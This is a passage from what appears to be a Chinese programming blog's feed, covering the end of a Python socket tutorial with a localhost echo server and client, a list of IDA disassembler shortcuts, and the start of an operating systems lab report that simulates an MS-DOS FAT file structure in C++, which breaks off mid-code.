socket.socket()</code>方法，我们可以获得一个socket对象s，也就是通常说的获取了一个“套接字”，该对象具有一下方法：</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><strong>服务器端方法</strong></td><td></td></tr><tr><td><strong>s.bind()</strong></td><td>绑定地址（host,port）到套接字，在AF_INET下,以元组（host,port）的形式表示地址。</td></tr><tr><td><strong>s.listen(backlog)</strong></td><td>开始监听。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。</td></tr><tr><td><strong>s.accept()</strong></td><td>被动接受客户端连接,(阻塞式)等待连接的到来，并返回（conn,address）二元元组,其中conn是一个通信对象，可以用来接收和发送数据。address是连接客户端的地址。</td></tr><tr><td><strong>客户端方法</strong></td><td></td></tr><tr><td><strong>s.connect(address)</strong></td><td>客户端向服务端发起连接。一般address的格式为元组（hostname,port），如果连接出错，返回socket.error错误。</td></tr><tr><td>s.connect_ex()</td><td>connect()函数的扩展版本,出错时返回出错码,而不是抛出异常</td></tr><tr><td><strong>公共方法</strong></td><td></td></tr><tr><td><strong>s.recv(bufsize)</strong></td><td>接收数据，数据以bytes类型返回，bufsize指定要接收的最大数据量。</td></tr><tr><td><strong>s.send()</strong></td><td>发送数据。返回值是要发送的字节数量。</td></tr><tr><td><strong>s.sendall()</strong></td><td>完整发送数据。将数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。</td></tr><tr><td>s.recvform()</td><td>接收UDP数据，与recv()类似，但返回值是（data,address）。其中data是包含接收的数据，address是发送数据的套接字地址。</td></tr><tr><td>s.sendto(data,address)</td><td>发送UDP数据，将数据data发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。</td></tr><tr><td><strong>s.close()</strong></td><td>关闭套接字，必须执行。</td></tr><tr><td>s.getpeername()</td><td>返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。</td></tr><tr><td>s.getsockname()</td><td>返回套接字自己的地址。通常是一个元组(ipaddr,port)</td></tr><tr><td>s.setsockopt(level,optname,value)</td><td>设置给定套接字选项的值。</td></tr><tr><td>s.getsockopt(level,optname[.buflen])</td><td>返回套接字选项的值。</td></tr><tr><td>s.settimeout(timeout)</td><td>设置套接字操作的超时期，timeout是一个浮点数，单位是秒。值为None表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如connect()）</td></tr><tr><td>s.gettimeout()</td><td>返回当前超时期的值，单位是秒，如果没有设置超时期，则返回None。</td></tr><tr><td>s.fileno()</td><td>返回套接字的文件描述符。</td></tr><tr><td>s.setblocking(flag)</td><td>如果flag为0，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用recv()没有发现任何数据，或send()调用无法立即发送数据，那么将引起socket.error异常。</td></tr><tr><td>s.makefile()</td><td>创建一个与该套接字相关连的文件</td></tr></tbody></table><p><strong>注意事项：</strong></p><ol><li>Python3以后，socket传递的都是<strong>bytes类型</strong>的数据，字符串需要先转换一下，<code>string.encode()</code>即可；另一端接收到的bytes数据想转换成字符串，只要<code>bytes.decode()</code>一下就可以。</li><li>在正常通信时，<code>accept()</code>和<code>recv()</code>方法都是阻塞的。所谓的阻塞，指的是程序会暂停在那，一直等到有数据过来。</li></ol><h1 id="socket编程思路"><a class="markdownIt-Anchor" href="#socket编程思路"></a> socket编程思路</h1><p><strong>服务端：</strong></p><ol><li>创建套接字，绑定套接字到本地IP与端口：socket.socket(socket.AF_INET,socket.SOCK_STREAM) , s.bind()</li><li>开始监听连接：s.listen()</li><li>进入循环，不断接受客户端的连接请求：s.accept()</li><li>接收传来的数据，或者发送数据给对方：s.recv() , s.sendall()</li><li>传输完毕后，关闭套接字：s.close()</li></ol><p><strong>客户端:</strong></p><ol><li>创建套接字，连接服务器地址：socket.socket(socket.AF_INET,socket.SOCK_STREAM) , s.connect()</li><li>连接后发送数据和接收数据：s.sendall(), s.recv()</li><li>传输完毕后，关闭套接字：s.close()</li></ol><p>Python的socket编程，通常可分为TCP和UDP编程两种，前者是带连接的可靠传输服务，每次通信都要握手，结束传输也要挥手，数据会被检验，是使用最广的通用模式；后者是不带连接的传输服务，简单粗暴，不加控制和检查的一股脑将数据发送出去的方式，但是传输速度快，通常用于安全和可靠等级不高的业务场景，比如文件下载。</p><h1 id="编程实现"><a class="markdownIt-Anchor" href="#编程实现"></a> 编程实现</h1><h2 id="服务器端"><a class="markdownIt-Anchor" href="#服务器端"></a> <strong>服务器端：</strong></h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br>ip_port = (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br><br>sk = socket.socket()            <span class="hljs-comment"># 创建套接字</span><br>sk.bind(ip_port)                <span class="hljs-comment"># 绑定服务地址</span><br>sk.listen(<span class="hljs-number">5</span>)                    <span class="hljs-comment"># 监听连接请求</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;启动socket服务，等待客户端连接...&#x27;</span>)<br>conn, address = sk.accept()     <span class="hljs-comment"># 等待连接，此处自动阻塞</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:     <span class="hljs-comment"># 一个死循环，直到客户端发送‘exit’的信号，才关闭连接</span><br>    client_data = conn.recv(<span class="hljs-number">1024</span>).decode()      <span class="hljs-comment"># 接收信息</span><br>    <span class="hljs-keyword">if</span> client_data == <span class="hljs-string">&quot;exit&quot;</span>:       <span class="hljs-comment"># 判断是否退出连接</span><br>        sk.close()  <span class="hljs-comment"># 关闭连接</span><br>        exit(<span class="hljs-string">&quot;通信结束&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;来自%s的客户端向你发来信息：%s&quot;</span> % (address, client_data))<br>    conn.sendall(<span class="hljs-string">&#x27;服务器已经收到你的信息&#x27;</span>.encode())    <span class="hljs-comment"># 回馈信息给客户端</span><br></code></pre></div></td></tr></table></figure><h2 id="客户端"><a class="markdownIt-Anchor" href="#客户端"></a> <strong>客户端：</strong></h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br>ip_port = (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br><br>s = socket.socket()     <span class="hljs-comment"># 创建套接字</span><br><br>s.connect(ip_port)      <span class="hljs-comment"># 连接服务器</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:     <span class="hljs-comment"># 通过一个死循环不断接收用户输入，并发送给服务器</span><br>    inp = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要发送的信息： &quot;</span>).strip()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> inp:     <span class="hljs-comment"># 防止输入空信息，导致异常退出</span><br>        <span class="hljs-keyword">continue</span><br>    s.sendall(inp.encode())<br><br>    <span class="hljs-keyword">if</span> inp == <span class="hljs-string">&quot;exit&quot;</span>:   <span class="hljs-comment"># 如果输入的是‘exit’，表示断开连接</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;结束通信！&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><br>    server_reply = s.recv(<span class="hljs-number">1024</span>).decode()<br>    <span class="hljs-built_in">print</span>(server_reply)<br><br>s.close()       <span class="hljs-comment"># 关闭连接</span><br></code></pre></div></td></tr></table></figure><p>上面这个例子，基本能够展示出socket通信的机制。套接字的创建和关闭，服务器的绑定和监听，客户端的连接，这些都是固定套路，没什么难点。关键之处在于循环内部的收发逻辑，这里才是重点，需要根据你自己的业务需求，正确编写。这个过程中，一定要注意，收发是一一对应的，有发就要有收，并且recv()方法默认是阻塞的。</p><p>参考链接：</p><p><a href="https://www.liujiangblog.com/course/python/76">https://www.liujiangblog.com/course/python/76</a></p><p><a href="https://docs.python.org/zh-cn/3/library/socket.html">socket python官方文档</a></p>]]></content>
    
    
    <categories>
      
      <category>Project</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>网络通信</tag>
      
      <tag>socket</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDA常用快捷键</title>
    <link href="/posts/c365298/"/>
    <url>/posts/c365298/</url>
    
    <content type="html"><![CDATA[<h1 id="常用快捷键"><a class="markdownIt-Anchor" href="#常用快捷键"></a> 常用快捷键</h1><p>IDA中的快捷键都是和菜单栏的各个功能选项一一对应的，基本上你只要能在菜单栏上找到某个功能，也就能看到相应的快捷键，这里记录几个常用的：</p><p>a：将数据转换为字符串</p><p>f5：一键反汇编</p><p>esc：回退键，能够倒回上一部操作的视图（只有在反汇编窗口才是这个作用，如果是在其他窗口按下esc，会关闭该窗口）</p><p>shift+f12：可以打开string窗口，一键找出所有的字符串，右击setup，还能对窗口的属性进行设置</p><p>ctrl+w：保存ida数据库</p><p>ctrl+s：选择某个数据段，直接进行跳转</p><p>ctrl+鼠标滚轮：能够调节流程视图的大小</p><p>x：对着某个函数、变量按该快捷键，可以查看它的交叉引用</p><p>g：直接跳转到某个地址</p><p>n：更改变量的名称</p><p>y：更改变量的类型</p><p>/ ：在反编译后伪代码的界面中写下注释</p><p>\：在反编译后伪代码的界面中隐藏/显示变量和函数的类型描述，有时候变量特别多的时候隐藏掉类型描述看起来会轻松很多</p><p>；：在反汇编后的界面中写下注释</p><p>ctrl+shift+w：拍摄IDA快照</p><p>u：undefine，取消定义函数、代码、数据的定义</p><p>H：在数字上按下H键或者右键进行选择，可以将数字转化为十进制：</p><p>B：按下<strong>B键</strong>转换为二进制也是同理。</p><p>c: 将数据段转化成代码</p><p><strong>参考链接</strong></p><p><a href="https://xz.aliyun.com/t/4205#toc-0">https://xz.aliyun.com/t/4205#toc-0</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>IDA</tag>
      
      <tag>逆向</tag>
      
      <tag>备忘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统Lab8-文件结构</title>
    <link href="/posts/6255939a/"/>
    <url>/posts/6255939a/</url>
    
    <content type="html"><![CDATA[<h1 id="操作系统第八次实验"><a class="markdownIt-Anchor" href="#操作系统第八次实验"></a> 操作系统第八次实验</h1><h1 id="文件结构"><a class="markdownIt-Anchor" href="#文件结构"></a> 文件结构</h1><h2 id="一-实验内容"><a class="markdownIt-Anchor" href="#一-实验内容"></a> 一、实验内容</h2><ol><li>把文件的逻辑结构转换成存储结构</li><li>设计便于顺序存取和直接存取的文件存储结构。</li></ol><h2 id="二-实验目的"><a class="markdownIt-Anchor" href="#二-实验目的"></a> 二、实验目的</h2><ul><li>研究用户概念中的信息组织方式</li><li>理解文件的逻辑结构、存取结构、存取方式之间的联系</li><li>模拟设计文件的存储结构</li></ul><h2 id="三-实验题目"><a class="markdownIt-Anchor" href="#三-实验题目"></a> 三、实验题目</h2><h3 id="第一题"><a class="markdownIt-Anchor" href="#第一题"></a> 第一题：</h3><p><strong>模拟设计MS-DOS操作系统中磁盘文件的存储结构。</strong></p><ol><li><p>当用户对记录式文件采用顺序存以方式时，用户总是依次地访问一个个逻辑记录，即当访问了第i个记录后，下次总是访问第i+1个记录。所以，当用户采用顺序存取方式访问文件时，只要给出访问要求（读或写）而无需再指出要访问的记录号。</p></li><li><p>采用链接文件结构，只有读出一个物理块信息后才能从链接字中得知下一个物理块号。所以，当用户要在文件中插入一些信息时，文件系统必须多次地请求启动磁盘读出信息才能做插入工作。</p><p>MS-DOS操作系统对链接文件结构作了改进，它是把所有的链接指针集中在一起，存放在文件定位表FAT中。查找链接字时不必读出物理块信息可直接从FAT中得到。</p></li></ol><ul><li>其设计思想是：<br>假定磁盘上共有N个物理块可供使用，FAT就有N项，初始化时为全“0”，表示对应的物理块均可使用，当要存放文件时，从FAT中寻找为“0”的项，其对应的物理块用来存放文件信息，把文件的链接指针（指出物理块号）登记在FAT中，文件第一块块号登记在文件目录中。</li></ul><p><img src="/posts/6255939a/image-20211217135713687.png" alt="image-20211217135713687"></p><ol start="3"><li>假定磁盘存储空间共有32个物理块，模拟设计文件定位表FAT。文件定位表可以用一个一维数组FAT[031]来定义，其中一个元素与一个物理块对应。当FAT[i]=0时，表示第i块为空闲块；当FAT[i]=FFF时，表示链接文件到第i块结束；当在0~FFF时，其值指示链接文件中下一个物理块号。</li><li>每个物理块只能存放一个逻辑记录，设计一个程序把文件的逻辑结构模拟转换成MS-DOS的链接结构。</li></ol><ul><li>要求保存一个已经在1 1主存中的文件时，给出文件名和文件的逻辑记录长度及个数，对一个已经保存的文件，允许用户插入新记录。用键盘输入来模拟用户的要求，输入信息为：<br>“存” 文件名 逻辑记录长度 逻辑记录个数“插入” 文件名 逻辑记录号</li><li>模拟程序的算法如下图所示：</li></ul><p><img src="/posts/6255939a/image-20211217135808878.png" alt="image-20211217135808878"></p><ol start="5"><li>假设系统中已经有两个链接文件，其链接情况由FAT表指出（链接情况学生自定)，现又要保存一个新文件，然后对已保存的文件插入一个新记录。运行你所设计的程序，观察其结果。</li></ol><h3 id="第二题"><a class="markdownIt-Anchor" href="#第二题"></a> 第二题：</h3><p><strong>模拟便于直接存取的索引文件结构</strong></p><ol><li><p>索引文件像链接文件一样，文件的逻辑记录信息可存放在非连续的磁盘存储空间中。但这些存放逻辑记录的存储空间不是按链表的形式链接在一起的，而是采用索引表来指出逻辑记录存放的物理位置。</p></li><li><p>文件目录与索引表的关系如下图所示：</p><p><img src="/posts/6255939a/image-20211219192945145.png" alt="image-20211219192945145"></p></li><li><p>建立索引文件的过程是：寻找一些空闲物理块；逻辑记录存入这些物理块中；把逻辑记录与物理块的对应关系登记在索引表中。</p></li></ol><h3 id="思考题"><a class="markdownIt-Anchor" href="#思考题"></a> 思考题：</h3><ol><li>链表文件结构和索引文件结构各自的优缺点是什么？</li><li>当文件较大时，使得索引表也较大，如果索引表的大小超过了一个物理块，如何进行索引表的存取？</li></ol><h2 id="四-实验设计与过程"><a class="markdownIt-Anchor" href="#四-实验设计与过程"></a> 四、实验设计与过程</h2><h3 id="第一题ms-dos磁盘文件存储结构"><a class="markdownIt-Anchor" href="#第一题ms-dos磁盘文件存储结构"></a> 第一题：MS-DOS磁盘文件存储结构</h3><h4 id="数据结构和符号说明"><a class="markdownIt-Anchor" href="#数据结构和符号说明"></a> <strong>数据结构</strong>和符号说明</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//文件定位表 fat</span><br><span class="hljs-keyword">int</span> fat[<span class="hljs-number">32</span>];<br><span class="hljs-keyword">char</span> phy_file[<span class="hljs-number">32</span>];<br><span class="hljs-comment">//主存剩余块的数量</span><br><span class="hljs-keyword">int</span> leftblocks = <span class="hljs-number">32</span>;<br><span class="hljs-comment">//文件目录</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">FD</span></span><br><span class="hljs-class">&#123;</span><br>    string name[<span class="hljs-number">32</span>];<br>    <span class="hljs-comment">//文件起始块号</span><br>    <span class="hljs-keyword">int</span> start[<span class="hljs-number">32</span>];<br>    <span class="hljs-comment">//每个文件逻辑长度</span><br>    <span class="hljs-keyword">int</span> filelength[<span class="hljs-number">32</span>];<br>    <span class="hljs-comment">//文件数量</span><br>    <span class="hljs-keyword">int</span> filenum;<br>&#125; fd;<br></code></pre></div></td></tr></table></figure><h4 id="函数说明"><a class="markdownIt-Anchor" href="#函数说明"></a> 函数说明</h4><p>一个存文件函数和一个插入文件函数，模拟链表实现。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//初始化函数，重置 fat</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-comment">//存文件操作</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">save</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-comment">//插入文件操作</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">()</span></span><br></code></pre></div></td></tr></table></figure><h4 id="源代码"><a class="markdownIt-Anchor" href="#源代码"></a> 源代码</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// MS-DOS 磁盘文件存储结构</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-comment">//文件定位表 fat</span><br><span class="hljs-keyword">int</span> fat[<span class="hljs-number">32</span>];<br><span class="hljs-keyword">char</span> phy_file[<span class="hljs-number">32</span>];<br><span class="hljs-comment">//主存剩余块的数量</span><br><span class="hljs-keyword">int</span> leftblocks = <span class="hljs-number">32</span>;<br><span class="hljs-comment">//文件目录</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">FD</span></span><br><span class="hljs-class">&#123;</span><br>    string name[<span class="hljs-number">32</span>];<br>    <span class="hljs-comment">//文件起始块号</span><br>    <span class="hljs-keyword">int</span> start[<span class="hljs-number">32</span>];<br>    <span class="hljs-comment">//文件数量</span><br>    <span class="hljs-keyword">int</span> filelength[<span class="hljs-number">32</span>];<br>    <span class="hljs-keyword">int</span> filenum;<br>&#125; fd;<br><br><span class="hljs-comment">//初始化函数，重置 fat</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>        fat[i] = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//将第一位设置为 FDF</span><br>    fat[<span class="hljs-number">0</span>] = <span class="hljs-number">-2</span>;<br>    <span class="hljs-comment">//将第二位设置成所有文件的结束 FFF</span><br>    fat[<span class="hljs-number">1</span>] = <span class="hljs-number">-1</span>;<br>    leftblocks -= <span class="hljs-number">2</span>;<br>    fd.filenum = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// cout &lt;&lt; fd.name &lt;&lt; endl;</span><br>    fd.name[++fd.filenum] = <span class="hljs-string">&quot;AB&quot;</span>;<br>    <span class="hljs-comment">// cout &lt;&lt; fd.name[fd.filenum] &lt;&lt; endl;</span><br>    fd.start[fd.filenum] = <span class="hljs-number">2</span>;<br>    fat[<span class="hljs-number">2</span>] = <span class="hljs-number">5</span>; <span class="hljs-comment">//初始化第一个文件</span><br>    fat[<span class="hljs-number">5</span>] = <span class="hljs-number">8</span>;<br>    fat[<span class="hljs-number">8</span>] = <span class="hljs-number">11</span>;<br>    fat[<span class="hljs-number">11</span>] = <span class="hljs-number">18</span>;<br>    fat[<span class="hljs-number">18</span>] = <span class="hljs-number">24</span>;<br>    fat[<span class="hljs-number">24</span>] = <span class="hljs-number">1</span>;<br>    fd.filelength[fd.filenum] = <span class="hljs-number">6</span>;<br><br>    fd.name[++fd.filenum] = <span class="hljs-string">&quot;B&quot;</span>; <span class="hljs-comment">//初始化第二个文件</span><br>    fd.start[fd.filenum] = <span class="hljs-number">6</span>;<br>    fat[<span class="hljs-number">6</span>] = <span class="hljs-number">9</span>;<br>    fat[<span class="hljs-number">9</span>] = <span class="hljs-number">14</span>;<br>    fat[<span class="hljs-number">14</span>] = <span class="hljs-number">19</span>;<br>    fat[<span class="hljs-number">19</span>] = <span class="hljs-number">22</span>;<br>    fat[<span class="hljs-number">22</span>] = <span class="hljs-number">28</span>;<br>    fat[<span class="hljs-number">28</span>] = <span class="hljs-number">30</span>;<br>    fat[<span class="hljs-number">30</span>] = <span class="hljs-number">1</span>;<br>    fd.filelength[fd.filenum] = <span class="hljs-number">7</span>;<br>&#125;<br><br><span class="hljs-comment">//寻找相同文件名的条目</span><br><span class="hljs-comment">//找到就返回在文件目录中的索引</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">FindFile</span><span class="hljs-params">(string filename)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= fd.filenum; i++)<br>        <span class="hljs-keyword">if</span> (fd.name[i] == filename)<br>            <span class="hljs-keyword">return</span> i;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//存文件操作</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">save</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string filename;<br>    cout &lt;&lt; <span class="hljs-string">&quot;请输入文件名: &quot;</span>;<br>    cin &gt;&gt; filename;<br>    <span class="hljs-comment">//首先寻找是不是有同名的文件</span><br>    <span class="hljs-comment">//如果有则不能重复插入</span><br>    <span class="hljs-keyword">int</span> num;<br>    cout &lt;&lt; <span class="hljs-string">&quot;请输入逻辑记录长度: &quot;</span>;<br>    cin &gt;&gt; num;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">FindFile</span>(filename) != <span class="hljs-number">0</span>)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;********存在同名文件，存操作执行失败！********&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//检查内存剩余的空间是不是够存储</span><br>    <span class="hljs-keyword">if</span> (num &gt; leftblocks)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;********存储的文件过大，无法存储！********&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//记录文件名称</span><br>    fd.name[++fd.filenum] = filename;<br>    <span class="hljs-keyword">int</span> pos = <span class="hljs-number">0</span>, lastpos;<br>    <span class="hljs-comment">//找 num 个空的内存块来存储，同时更新索引</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= num; i++)<br>    &#123;<br>        <span class="hljs-comment">//找到一个空的位置</span><br>        <span class="hljs-keyword">while</span> (fat[pos] != <span class="hljs-number">0</span>)<br>            pos = (pos + <span class="hljs-number">1</span>) % <span class="hljs-number">32</span>;<br>        <span class="hljs-comment">//如果是文件的起始块号则直接存储下一个块的索引</span><br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">1</span>)<br>            fd.start[fd.filenum] = pos;<br>        <span class="hljs-comment">//不是起始块则将上一个块的索引设置成当前的地址</span><br>        <span class="hljs-keyword">else</span><br>            fat[lastpos] = pos;<br>        <span 